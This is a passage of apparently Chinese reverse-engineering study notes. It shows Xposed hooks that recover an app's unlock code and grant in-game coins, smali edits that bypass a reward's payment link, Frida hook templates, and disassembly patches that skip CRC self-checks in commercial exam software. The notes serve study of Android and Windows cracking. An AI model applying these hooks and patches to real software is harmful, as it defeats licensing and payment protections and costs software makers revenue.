class="type">boolean</span> a;<span class="comment">//属性a</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        a.a = <span class="literal">false</span>;<span class="comment">//属性a一开始为false</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">a</span><span class="params">(String arg1)</span> &#123;<span class="comment">//方法a</span></span><br><span class="line">        <span class="keyword">if</span>(a.a) &#123;<span class="comment">//如果属性a为true，输出Log</span></span><br><span class="line">            Log.i(<span class="string">&quot;Tiger_test&quot;</span>, arg1);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>com.hfdcxy.android.by.test</code>包中有一个类a，其中有一个方法a。<code>test.a.a</code>的作用是MD5加密。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.hfdcxy.android.by.test;</span><br><span class="line"><span class="keyword">import</span> java.security.MessageDigest;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">a</span> &#123;<span class="comment">//类a</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">a</span><span class="params">(String arg6)</span> &#123;<span class="comment">//方法a</span></span><br><span class="line">        MessageDigest v2;</span><br><span class="line">        <span class="type">int</span> <span class="variable">v1</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            v2 = MessageDigest.getInstance(<span class="string">&quot;MD5&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(Exception v0) &#123;</span><br><span class="line">            System.out.println(v0.toString());</span><br><span class="line">            v0.printStackTrace();</span><br><span class="line">            <span class="type">String</span> <span class="variable">v0_1</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> v0_1;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">char</span>[] v3 = arg6.toCharArray();</span><br><span class="line">        <span class="type">byte</span>[] v4 = <span class="keyword">new</span> <span class="title class_">byte</span>[v3.length];</span><br><span class="line">        <span class="type">int</span> v0_2;</span><br><span class="line">        <span class="keyword">for</span>(v0_2 = <span class="number">0</span>; v0_2 &lt; v3.length; ++v0_2) &#123;</span><br><span class="line">            v4[v0_2] = ((<span class="type">byte</span>)v3[v0_2]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] v0_3 = v2.digest(v4);</span><br><span class="line">        <span class="type">StringBuffer</span> <span class="variable">v2_1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>();</span><br><span class="line">        <span class="keyword">while</span>(v1 &lt; v0_3.length) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">v3_1</span> <span class="operator">=</span> v0_3[v1] &amp; <span class="number">255</span>;</span><br><span class="line">            <span class="keyword">if</span>(v3_1 &lt; <span class="number">16</span>) &#123;</span><br><span class="line">                v2_1.append(<span class="string">&quot;0&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            v2_1.append(Integer.toHexString(v3_1));</span><br><span class="line">            ++v1;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> v2_1.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为解锁成功与否的过程没用到<code>b.a</code>，暂时先不分析它。</p><p>重新看这条关键代码，它的意思是v0等于当前手机的<code>android_id</code>经过MD5加密后与固定字符串<code>hfdcxy1011</code>进行拼接后再进行一次MD5加密得到的值截取前6位。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">v0</span> <span class="operator">=</span> a.a(a.a(Settings$System.getString(<span class="built_in">this</span>.a.getContentResolver(), <span class="string">&quot;android_id&quot;</span>)) + <span class="string">&quot;hfdcxy1011&quot;</span>).substring(<span class="number">0</span>, <span class="number">6</span>);</span><br></pre></td></tr></table></figure><p>这里有三种方式可以把这个解锁码打印出来：</p><p>(1)我们知道<code>test.a.a</code>方法是最后一层加密，我们可以hook这个a方法把它的返回值打印出来，然后取其前6位为解锁码；</p><p>(2)因为整个apk只有一处对<code>substring</code>的调用，我们可以hook系统函数<code>substring</code>把函数返回值打印出来；</p><p>(3)通过分析知道<code>a.a.a</code>方法为log打印的方法，我们可以hook这个a方法的参数，把解锁码通过Log打印出来。</p><p>这里取第一种。</p><p>方法的包名+类名：com.hfdcxy.android.by.test.a<br>方法名：a<br>方法的参数类型：String</p><p>过滤下包名防止Xposed找不到包名对应的类报错，这里的包名是<code>manifest</code>标签下的包名<code>com.ss.android.ugc.aweme</code>。</p><img src="/posts/15be101a/12.4.png" class="" title="包名"><p>在第11节程序里面的hook类编写hook代码。就是模板，往里塞参数就行。</p><img src="/posts/15be101a/12.5.png" class="" title="hook代码"><p>连上模拟器，安装app，Xposed Installer勾选相应程序模块，重启模拟器。运行<code>解锁程序.apk</code>，随意输入解锁码，点击解锁。回到AS搜索Log。</p><img src="/posts/15be101a/12.6.png" class="" title="Logcat"><p>因为<code>test.a.a</code>共调用了两次，第一次<code>MD5(android_id)</code>，第二次<code>MD5(MD5(android_id)+hfdcxy1011)</code>，取最后一次的前6位才是解锁码116f58。</p><p>输入解锁码，进入充值页面。</p><img src="/posts/15be101a/12.7.png" class="" title="解锁成功"><p>点几下充值金币，再点开启宝箱，发现金币不足。回jeb继续分析代码。我们已经进入“解锁成功”的代码里去，看到里面调用了<code>DrawActivity</code>类。</p><img src="/posts/15be101a/12.8.png" class="" title="DrawActivity"><p>进去看看。</p><img src="/posts/15be101a/12.9.png" class="" title="DrawActivity"><p>也就是需要点击9999次才能开启宝箱，达咩！我们的思路是直接hook第一个按钮，修改<code>test.b.a</code>方法，使按一次就有10000金币。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.hfdcxy.android.by.test;</span><br><span class="line"><span class="keyword">import</span> android.content.SharedPreferences$Editor;</span><br><span class="line"><span class="keyword">import</span> android.content.SharedPreferences;</span><br><span class="line"><span class="keyword">import</span> android.widget.TextView;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">b</span> &#123;<span class="comment">//类b</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">b</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">a</span><span class="params">(SharedPreferences arg5, TextView arg6, <span class="type">int</span> arg7)</span> &#123;<span class="comment">//方法a，arg7是点击一次增加的金币数</span></span><br><span class="line">        <span class="type">SharedPreferences$Editor</span> <span class="variable">v0</span> <span class="operator">=</span> arg5.edit();</span><br><span class="line">        v0.putInt(<span class="string">&quot;coin&quot;</span>, arg5.getInt(<span class="string">&quot;coin&quot;</span>, <span class="number">0</span>) + arg7);</span><br><span class="line">        v0.commit();</span><br><span class="line">        arg6.setText(String.valueOf(arg5.getInt(<span class="string">&quot;coin&quot;</span>, <span class="number">0</span>)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>方法的包名+类名：com.hfdcxy.android.by.test.b<br>方法名：a<br>方法的参数类型：SharedPreferences、TextView、int</p><p>编写hook代码：</p><img src="/posts/15be101a/12.10.png" class="" title="hook代码"><p>同样操作走一次，开启宝箱。</p><img src="/posts/15be101a/12.12.png" class="" title="开启宝箱"><img src="/posts/15be101a/12.11.png" class="" title="开启宝箱"><p>我们可以尝试一下获取解锁码的第二第三种方法。</p><p>第二种：<code>substring</code>是一个Java系统内部的方法，百度搜一下它的构造方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">substring</span><span class="params">(<span class="type">int</span> beginIndex)</span></span><br><span class="line"></span><br><span class="line">或</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">substring</span><span class="params">(<span class="type">int</span> beginIndex, <span class="type">int</span> endIndex)</span></span><br></pre></td></tr></table></figure><p>方法的包名+类名：java.lang.String<br>方法名：substring<br>方法的参数类型：int、int</p><p>编写Xpose代码：</p><img src="/posts/15be101a/12.14.png" class="" title="xpose代码"><img src="/posts/15be101a/12.13.png" class="" title="解锁码"><p>哈哈哈好像不止一个，但很容易知道哪个是解锁码，但是下面这样写是不行。</p><p>方法的包名+类名：com.hfdcxy.android.by.test.a.a<br>方法名：substring<br>方法的参数类型：int、int</p><p>第三种：通过<code>a.a.a</code>方法打印Log。因为v0是解锁码的前6位，刚好下一行就是Log输出v0的代码。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">v0</span> <span class="operator">=</span> a.a(a.a(Settings$System.getString(<span class="built_in">this</span>.a.getContentResolver(), <span class="string">&quot;android_id&quot;</span>)) + <span class="string">&quot;hfdcxy1011&quot;</span>).substring(<span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line">com.hfdcxy.android.by.a.a.a(<span class="string">&quot;解锁码&quot;</span> + v0);</span><br></pre></td></tr></table></figure><p>方法的包名+类名：com.hfdcxy.android.by.a.a<br>方法名：a<br>方法的参数类型：String</p><img src="/posts/15be101a/12.15.png" class="" title="解锁码"><h1 id="13-Xpose实战2"><a href="#13-Xpose实战2" class="headerlink" title="13. Xpose实战2"></a>13. Xpose实战2</h1><p>目标：hook修改极品美女找茬游戏中的金币余额为999。</p><p>运行apk，每次评论或分享都可以获得50金币。</p><img src="/posts/15be101a/13.1.png" class="" title="找茬求助界面"><p>AK查看apk，manifest标签的包名为com.jimmy.beauty.pick，application标签添加android_debugable=”true”。</p><p>jeb中在smali代码中搜索“金币”，发现它在SOSActivity中。</p><img src="/posts/15be101a/13.2.png" class="" title="100金币"><p>进入SOSActivity反编译成Java代码，在某个case中发现CommentActivity。</p><img src="/posts/15be101a/13.3.png" class="" title="SOSActivity"><p>继续进去CommentActivity看看。有个按钮事件，一个是“现在去给”评价，另一个是“以后再说”。修改的思路是将giveComment方法放到“以后再说”，再将giveComment方法里的前3行都去掉，因为那几行代码是构造支付链接。这些都是在AK中修改smali代码完成的。</p><img src="/posts/15be101a/13.4.png" class="" title="giveComment"><p>进去setMoney方法，一个参数为Context类型，一个参数为int类型。</p><img src="/posts/15be101a/13.5.png" class="" title="setMoney"><p>此时可以hook这个setMoney方法了。</p><img src="/posts/15be101a/13.6.png" class="" title="hook代码"><p>连上模拟器，安装app，Xposed Installer勾选相应程序模块，重启模拟器。运行程序，开一局游戏，求助 -&gt; 评论 -&gt; 以后再说，就可以获得999金币！</p><img src="/posts/15be101a/13.7.png" class="" title="hook代码"><h1 id="14-adb注意事项"><a href="#14-adb注意事项" class="headerlink" title="14. adb注意事项"></a>14. adb注意事项</h1><p>每次打开AS模拟器都会弹出如下图所示的错误：</p><img src="/posts/15be101a/14.1.png" class="" title="错误"><p>是因为5037端口被占用了。在cmd输入<code>netstat -ano|findstr &quot;5037&quot;</code>查看被哪个进程占用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\dell&gt;netstat -ano|findstr &quot;5037&quot;</span><br><span class="line">  TCP    [::1]:3425             [::1]:5037             SYN_SENT        18760</span><br></pre></td></tr></table></figure><p>输入<code>taskkill -f -pid 18760</code>杀死相应的进程。</p><h1 id="15-Native层hook"><a href="#15-Native层hook" class="headerlink" title="15. Native层hook"></a>15. Native层hook</h1><p>本来想安装Cydia Substrate的，结果这个软件很久没更新了，最高只支持安卓系统4.3的，模拟器和近几年的真机都安装不了，所以换了另一个框架Frida。</p><p><a href="https://www.52pojie.cn/thread-1128884-1-1.html">Frida超详细安装实战教程</a></p><h2 id="15-1-Frida-hook-java"><a href="#15-1-Frida-hook-java" class="headerlink" title="15.1 Frida hook java"></a>15.1 Frida hook java</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida  <span class="comment">#导入frida模块</span></span><br><span class="line"><span class="keyword">import</span> sys    <span class="comment">#导入sys模块</span></span><br><span class="line"></span><br><span class="line">jscode = <span class="string">&quot;&quot;&quot;  #从此处开始定义用来Hook的javascript代码</span></span><br><span class="line"><span class="string">    Java.perform(function()&#123;  </span></span><br><span class="line"><span class="string">        var MainActivity = Java.use(&#x27;com.example.testfrida.MainActivity&#x27;); //获得MainActivity类</span></span><br><span class="line"><span class="string">        MainActivity.testFrida.implementation = function()&#123; //Hook testFrida函数，用js自己实现</span></span><br><span class="line"><span class="string">            send(&#x27;Statr! Hook!&#x27;); //发送信息，用于回调python中的函数</span></span><br><span class="line"><span class="string">            return &#x27;Change String!&#x27; //劫持返回值，修改为我们想要返回的字符串</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;);</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">on_message</span>(<span class="params">message,data</span>): <span class="comment">#js中执行send函数后要回调的函数</span></span><br><span class="line">    <span class="built_in">print</span>(message)</span><br><span class="line"></span><br><span class="line">process = frida.get_remote_device().attach(<span class="string">&#x27;com.example.testfrida&#x27;</span>) <span class="comment">#得到设备并劫持进程com.example.testfrida（该开始用get_usb_device函数用来获取设备，但是一直报错找不到设备，改用get_remote_device函数即可解决这个问题）</span></span><br><span class="line">script = process.create_script(jscode) <span class="comment">#创建js脚本</span></span><br><span class="line">script.on(<span class="string">&#x27;message&#x27;</span>,on_message) <span class="comment">#加载回调函数，也就是js中执行send函数规定要执行的python函数</span></span><br><span class="line">script.load() <span class="comment">#加载脚本</span></span><br><span class="line">sys.stdin.read()</span><br></pre></td></tr></table></figure><h2 id="15-2-Frida-hook-返回值为int类型"><a href="#15-2-Frida-hook-返回值为int类型" class="headerlink" title="15.2 Frida hook 返回值为int类型"></a>15.2 Frida hook 返回值为int类型</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">jscode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Java.perform(function()&#123;</span></span><br><span class="line"><span class="string">    //下面这一句代码是指定要Hook的so文件名和要Hook的函数名，函数名就是上面IDA导出表中显示的那个函数名</span></span><br><span class="line"><span class="string">    Interceptor.attach(Module.findExportByName(&quot;libfridaso.so&quot;,&quot;Java_com_example_fridaso_FridaSoDefine_FridaSo&quot;),&#123;</span></span><br><span class="line"><span class="string">        //onEnter: function(args)顾名思义就是进入该函数前要执行的代码，其中args是传入的参数，一般so层函数第一个参数都是JniEnv，第二个参数是jclass，从第三个参数开始才是我们java层传入的参数</span></span><br><span class="line"><span class="string">        onEnter: function(args) &#123;</span></span><br><span class="line"><span class="string">            send(&quot;Hook start&quot;);</span></span><br><span class="line"><span class="string">            send(&quot;args[2]=&quot; + args[2]); //打印我们java层第一个传入的参数</span></span><br><span class="line"><span class="string">            send(&quot;args[3]=&quot; + args[3]); //打印我们java层传入的第二个参数</span></span><br><span class="line"><span class="string">        &#125;,</span></span><br><span class="line"><span class="string">        onLeave: function(retval)&#123; //onLeave: function(retval)是该函数执行结束要执行的代码，其中retval参数即是返回值</span></span><br><span class="line"><span class="string">            send(&quot;return:&quot;+retval); //打印返回值</span></span><br><span class="line"><span class="string">            retval.replace(0); //替换返回值为0</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;);</span></span><br><span class="line"><span class="string">&#125;);</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printMessage</span>(<span class="params">message,data</span>):</span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;send&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;&#123;0&#125;&#x27;</span>.<span class="built_in">format</span>(message[<span class="string">&#x27;payload&#x27;</span>]))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(message)</span><br><span class="line"></span><br><span class="line">process = frida.get_remote_device().attach(<span class="string">&#x27;com.example.fridaso&#x27;</span>)</span><br><span class="line">script = process.create_script(jscode)</span><br><span class="line">script.on(<span class="string">&#x27;message&#x27;</span>,printMessage)</span><br><span class="line">script.load()</span><br><span class="line">sys.stdin.read()</span><br></pre></td></tr></table></figure><h2 id="15-3-Frida-hook-返回值为String类型"><a href="#15-3-Frida-hook-返回值为String类型" class="headerlink" title="15.3 Frida hook 返回值为String类型"></a>15.3 Frida hook 返回值为String类型</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">jscode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Java.perform(function()&#123;</span></span><br><span class="line"><span class="string">    Interceptor.attach(Module.findExportByName(&quot;libfridaso.so&quot;,&quot;Java_com_example_fridasostring_fridaSoString_FridaSo&quot;),&#123;</span></span><br><span class="line"><span class="string">        onEnter: function(args) &#123;</span></span><br><span class="line"><span class="string">            send(&quot;Hook start&quot;);</span></span><br><span class="line"><span class="string">            send(&quot;args[2]=&quot; + args[2]);</span></span><br><span class="line"><span class="string">        &#125;,</span></span><br><span class="line"><span class="string">        onLeave: function(retval)&#123;</span></span><br><span class="line"><span class="string">            send(&quot;return:&quot;+retval);</span></span><br><span class="line"><span class="string">            var env = Java.vm.getEnv(); //获取env对象，也就是native函数的第一个参数</span></span><br><span class="line"><span class="string">            var jstrings = env.newStringUtf(&quot;tamper&quot;); //因为返回的是字符串指针，使用我们需要构造一个newStringUtf对象，用来代替这个指针</span></span><br><span class="line"><span class="string">            retval.replace(jstrings); //替换返回值</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;);</span></span><br><span class="line"><span class="string">&#125;);</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printMessage</span>(<span class="params">message,data</span>):</span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;send&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;&#123;0&#125;&#x27;</span>.<span class="built_in">format</span>(message[<span class="string">&#x27;payload&#x27;</span>]))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(message)</span><br><span class="line"></span><br><span class="line">process = frida.get_remote_device().attach(<span class="string">&#x27;com.example.fridasostring&#x27;</span>)</span><br><span class="line">script = process.create_script(jscode)</span><br><span class="line">script.on(<span class="string">&#x27;message&#x27;</span>,printMessage)</span><br><span class="line">script.load()</span><br><span class="line">sys.stdin.read()</span><br></pre></td></tr></table></figure><h2 id="15-4-Native-hook实战"><a href="#15-4-Native-hook实战" class="headerlink" title="15.4. Native hook实战"></a>15.4. Native hook实战</h2><p><a href="https://v5le0n9.github.io/posts/9f62af2.html#20-ill-intentions">攻防世界 ill-intentions</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;1-初识APK、Dalvik字节码以及Smali&quot;&gt;&lt;a href=&quot;#1-初识APK、Dalvik字节码以及Smali&quot; class=&quot;headerlink&quot; title=&quot;1. 初识APK、Dalvik字节码以及Smali&quot;&gt;&lt;/a&gt;1. 初识APK、Dalvik字节码以及Smali&lt;/h1&gt;&lt;p&gt;后缀名为&lt;code&gt;.apk&lt;/code&gt;是安卓手机app的格式。它的实质是一个ZIP压缩包，将它的后缀名修改为&lt;code&gt;.zip&lt;/code&gt;便可以看到内部的文件结构。解压出来后一般有以下文件：&lt;/p&gt;</summary>
    
    
    
    <category term="Android逆向" scheme="http://example.com/categories/Android%E9%80%86%E5%90%91/"/>
    
    
    <category term="Java" scheme="http://example.com/tags/Java/"/>
    
    <category term="IDA" scheme="http://example.com/tags/IDA/"/>
    
    <category term="Android Killer" scheme="http://example.com/tags/Android-Killer/"/>
    
    <category term="吾爱破解培训" scheme="http://example.com/tags/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD/"/>
    
  </entry>
  
  <entry>
    <title>吾爱破解学习指导教程</title>
    <link href="http://example.com/posts/f398dcca.html"/>
    <id>http://example.com/posts/f398dcca.html</id>
    <published>2022-04-05T01:29:28.202Z</published>
    <updated>2022-04-11T05:27:47.654Z</updated>
    
    <content type="html"><![CDATA[<p>NO.1~NO.3在<a href="https://v5le0n9.github.io/posts/e2d652c5.html">第一课——脱壳基础</a>就已经实践完了，所以这个笔记从NO.4开始。这个笔记是在<a href="https://v5le0n9.github.io/posts/33a085c7.html">调试器使用教程</a>的基础上讲解，所以一定要保证自己已经了解OD的基本操作才推荐看这个笔记，但绝对会比论坛的大牛们讲解的详细。</p><span id="more"></span><h1 id="NO-4-破解实战"><a href="#NO-4-破解实战" class="headerlink" title="NO.4 破解实战"></a>NO.4 破解实战</h1><p>由于我是用户大牛在讲解的帖子上没有附上实验程序的下载链接，所以只能挑附上下载链接的进行详细记录，没有附上下载链接的只能讲解流程，详细请看我是用户的帖子。</p><h2 id="第一战：超级U盘锁"><a href="#第一战：超级U盘锁" class="headerlink" title="第一战：超级U盘锁"></a>第一战：超级U盘锁</h2><p><a href="https://www.52pojie.cn/thread-197281-1-1.html">https://www.52pojie.cn/thread-197281-1-1.html</a></p><p>ASPack壳+两处自校验+跳转爆破/赋值爆破</p><h2 id="第二战：豪杰屏幕录像机-v2-0"><a href="#第二战：豪杰屏幕录像机-v2-0" class="headerlink" title="第二战：豪杰屏幕录像机 v2.0"></a>第二战：豪杰屏幕录像机 v2.0</h2><p><a href="http://www.52pojie.cn/thread-197598-1-1.html">http://www.52pojie.cn/thread-197598-1-1.html</a></p><p>修改DLL</p><h2 id="第三战：LukoolRecorder2-7-5cn"><a href="#第三战：LukoolRecorder2-7-5cn" class="headerlink" title="第三战：LukoolRecorder2.7.5cn"></a>第三战：LukoolRecorder2.7.5cn</h2><p><a href="https://www.52pojie.cn/thread-197957-1-1.html">https://www.52pojie.cn/thread-197957-1-1.html</a></p><p>明码比较+跳转爆破/赋值爆破</p><h2 id="第四战：PilotEdit5-9"><a href="#第四战：PilotEdit5-9" class="headerlink" title="第四战：PilotEdit5.9"></a>第四战：PilotEdit5.9</h2><p><a href="https://www.52pojie.cn/thread-198203-1-1.html">https://www.52pojie.cn/thread-198203-1-1.html</a></p><p>跳转爆破</p><h2 id="第五战：文件夹加密精灵V5-3"><a href="#第五战：文件夹加密精灵V5-3" class="headerlink" title="第五战：文件夹加密精灵V5.3"></a>第五战：文件夹加密精灵V5.3</h2><p><a href="https://www.52pojie.cn/thread-198365-1-1.html">https://www.52pojie.cn/thread-198365-1-1.html</a></p><p>重启验证+跳转爆破+算法分析(MD5+程序加密算法)</p><h2 id="第六战：-帖子被删除了"><a href="#第六战：-帖子被删除了" class="headerlink" title="第六战：(帖子被删除了)"></a>第六战：(帖子被删除了)</h2><h2 id="第七战：XX注册税务师考试锦囊-完"><a href="#第七战：XX注册税务师考试锦囊-完" class="headerlink" title="第七战：XX注册税务师考试锦囊(完)"></a>第七战：XX注册税务师考试锦囊(完)</h2><p><a href="https://www.52pojie.cn/thread-199459-1-1.html">https://www.52pojie.cn/thread-199459-1-1.html</a></p><p>MPRESS壳+CRC相互校验+浮点错误+爆破+去除NAG</p><p>先运行一下程序，单独打开<code>ESIExamPlatform.exe</code>(主程序)是运行不了的，需要打开<code>ESPlatform.exe</code>再让它自行启动<code>ESIExamPlatform.exe</code>。查壳，两个都有MPRESS壳。</p><p>先解决两个程序的脱壳问题。这是个压缩壳，用ESP定律秒脱。脱完名字要改为原程序的名字。脱完壳后两个程序都显示CRC校验失败。</p><img src="/posts/f398dcca/4.7.2.png" class="" title="CRC校验失败"><p>载入<code>ESIExamPlatform.exe</code>搜索字符串把它跳过。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">00419DA1   . /7C 1C         jl short ESIExamP.00419DBF;nop掉</span><br><span class="line">00419DA3   . |68 206D4A00   push ESIExamP.004A6D20                   ;  495</span><br><span class="line">00419DA8   . |50            push eax</span><br><span class="line">00419DA9   . |E8 B4A40500   call ESIExamP.00474262</span><br><span class="line">00419DAE   . |83C4 08       add esp,0x8</span><br><span class="line">00419DB1   . |85C0          test eax,eax</span><br><span class="line">00419DB3   . |74 0A         je short ESIExamP.00419DBF;nop掉</span><br><span class="line">00419DB5   . |2B4424 14     sub eax,dword ptr ss:[esp+0x14]</span><br><span class="line">00419DB9   . |D1F8          sar eax,1</span><br><span class="line">00419DBB   . |3BC6          cmp eax,esi</span><br><span class="line">00419DBD   . |75 62         jnz short ESIExamP.00419E21;改为jmp</span><br><span class="line">00419DBF   &gt; \6A 00         push 0x0</span><br><span class="line">00419DC1   .  6A 00         push 0x0</span><br><span class="line">00419DC3   .  68 286D4A00   push ESIExamP.004A6D28                   ;   《考试锦囊》CRC校验失败，请杀毒后重新下载本系统！</span><br><span class="line">00419DC8   .  E8 02FB0300   call ESIExamP.004598CF</span><br></pre></td></tr></table></figure><p>载入<code>ESPlatform.exe</code>搜索字符串把它跳过。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 